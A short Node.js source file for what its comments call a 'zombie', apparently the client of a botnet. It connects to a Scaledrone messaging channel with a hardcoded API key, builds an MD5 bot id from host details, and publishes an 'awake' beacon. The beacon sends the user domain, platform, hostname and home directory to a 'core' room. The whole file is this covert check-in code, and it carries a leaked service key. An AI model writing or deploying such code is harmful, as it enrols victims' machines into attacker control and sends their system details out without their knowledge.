const os = require('os');
const forge = require('node-forge');

// create a new connection to the scaledrone channel
// TODO remove key before push
var drone = new Scaledrone('TNjlnJtr3GgwfY8t');
console.log('created drone object, trying connection ...');

// open the connection to the channel
drone.on('open', function(error) {
    if (error)
        console.log(error);
    else
        console.log('no errors were encountered');

    // if we reach this point, we have connected to the channel
    console.log('connected to the channel');

    // generate an id for this zombie
    var md = forge.md.md5.create();
    md.update(process.env.USERDOMAIN + os.platform() + os.hostname() + os.homedir());
    var id = md.digest().toHex();

    // send an awake message on the channel
    drone.publish({
        room: 'core',
        message: {
            id: id,
            note: process.env.USERDOMAIN + ' is now awake',
            name: process.env.USERDOMAIN,
            os: os.platform(),
            hostname: os.hostname(),
            home: os.homedir()
        }
    });
});
